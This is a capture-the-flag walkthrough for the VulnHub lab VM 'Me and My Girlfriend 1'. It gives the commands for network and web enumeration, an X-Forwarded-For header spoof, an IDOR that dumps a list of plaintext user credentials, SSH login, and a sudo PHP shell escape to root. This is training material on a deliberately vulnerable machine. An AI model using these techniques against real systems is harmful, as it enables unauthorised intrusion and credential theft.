# Walkthrough: [Me and My Girlfriend 1](https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/)

## Table of Contents

- [Enumeration](#enumeration)
- [Penetration](#penetration)
- [Privilege Escelation](#privilege-escelation)

## Enumeration 
- VM IP: `sudo netdiscover`

	* `VMWare 192.168.0.14`
	
- VM info: `nmap -A -T4 -v 192.168.0.14`

	* <pre>
	  22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
	  80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
	  </pre>
	  
- web Server Directory: `dirb -w http://192.168.0.14`

	* <pre>
	  http://192.168.0.14/index.php
	  http://192.168.0.14/misc/process.php
	  http://192.168.0.14/config/config.php
	  http://192.168.0.14/heyhoo.txt
	  </pre>

## Penetration
- *index.php* requires local machine access
- Header capture/info with **Fiddler**
- Customize header with a browser extension(simply add `X-Forwarded-For: 0.0.0.0`)
- Local access granted 
- Register page: http://192.168.0.14/index.php?page=register
- Login page: http://192.168.0.14/index.php?page=login
- Profile page: http://192.168.0.14/index.php?page=profile&user_id=13
- `form action="#"` -> POSTS data on index.php?page=profile
- *user_id* allows to get all the name,uname,pass values 
- uname:pass list 
	* <pre>
	  1.eweuhtandingan:skuyatuh
	  2.aingmaung:qwerty!!!
	  3.sundatea:indONEsia
	  4.sedihaingmah:cedihhihihi
	  5.alice:4lic3  <--------------- Alice's credentials
	  6.abdikasepak:dorrrrr
	  </pre>
- `ssh 192.168.1.13 -l alice`
- Login in and capture **first flag**
		  
## Privilege Escelation
- `sudo -l`
	* alice has root access on /usr/bin/php
- `sudo php -r 'shell_exec("sudo /bin/bash -i 1>&0");'`
- Root access granted
- `cd /root && cat flag*` and capture the **second flag**





